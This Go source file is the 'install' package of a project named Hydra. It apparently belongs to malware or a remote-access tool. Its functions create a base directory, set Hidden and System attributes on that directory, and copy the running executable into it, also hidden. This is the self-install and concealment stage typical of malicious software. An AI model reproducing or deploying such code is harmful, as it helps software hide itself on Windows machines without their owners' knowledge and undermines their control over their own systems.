package install

import (
	"log"
	"os"
	"path"
	"syscall"

	"github.com/Raffy27/Hydra/util"
	"golang.org/x/sys/windows"
)

func IsInstalled() bool {
	base := os.ExpandEnv(util.Base)
	fi, err := os.Stat(base)
	if os.IsNotExist(err) {
		log.Println("Base does not exist")
		return false
	}
	if !fi.IsDir() {
		log.Println("Base is not a directory")
		return false
	}
	return true
}

//HideFile works on a file or a directory and applies Hidden and Sysfile attributes.
func HideFile(fn string) error {
	pchar, err := syscall.UTF16PtrFromString(fn)
	if err != nil {
		return err
	}
	err = windows.SetFileAttributes(pchar, windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM)
	return err
}

//CreateBase establishes an free directory as specified in Constants.
func CreateBase() error {
	base := os.ExpandEnv(util.Base)
	if err := os.Mkdir(base, os.ModeDir); err != nil {
		return err
	}
	return HideFile(base)
}

//CopyExecutable copies the current binary to the Base.
func CopyExecutable() error {
	bin := path.Join(os.ExpandEnv(util.Base), util.Binary)
	err := util.CopyFile(os.Args[0], bin)
	if err != nil {
		return err
	}
	return HideFile(bin)
}
